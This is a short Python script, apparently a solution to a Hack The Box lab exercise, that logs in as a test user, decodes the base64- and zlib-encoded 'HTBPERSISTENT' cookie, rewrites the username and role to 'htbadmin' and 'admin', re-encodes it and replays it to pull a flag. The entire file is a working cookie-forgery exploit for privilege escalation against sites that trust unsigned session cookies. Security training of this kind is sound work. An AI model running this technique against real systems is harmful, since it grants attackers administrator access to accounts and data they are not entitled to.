import zlib
import base64  
import urllib.parse 
import re  
import requests  


def decrypt(cipher):
	b_decode = base64.b64decode(urllib.parse.unquote(cipher))
	text = zlib.decompress(b_decode).decode()
	return text 

def encrypt(text):
	zlib_compress = zlib.compress(text.encode())
	return base64.b64encode(zlib_compress).decode()

def change_cookie(text, user, role):
	cookie_txt = re.sub("htbuser", user, text)	
	cookie_txt = re.sub("student", role, cookie_txt)
	return cookie_txt


url = "http://139.59.176.158:30113/question2/"
data = {
	"Username": "htbuser",
	"Password": "htbuser",
	"rememberme": "rememberme"
}

r = requests.post(url, data=data)
user_cookie = r.cookies["HTBPERSISTENT"]
user_cookie = decrypt(user_cookie)
admin_cookie_txt = change_cookie(user_cookie, "htbadmin", "admin")
admin_cookie = encrypt(admin_cookie_txt)

cookies = {
	"HTBPERSISTENT": admin_cookie
}

r2 = requests.get(url, cookies=cookies)
answer = re.findall(r'here is your flag (.*)</strong>', r2.text)
print(answer[0])
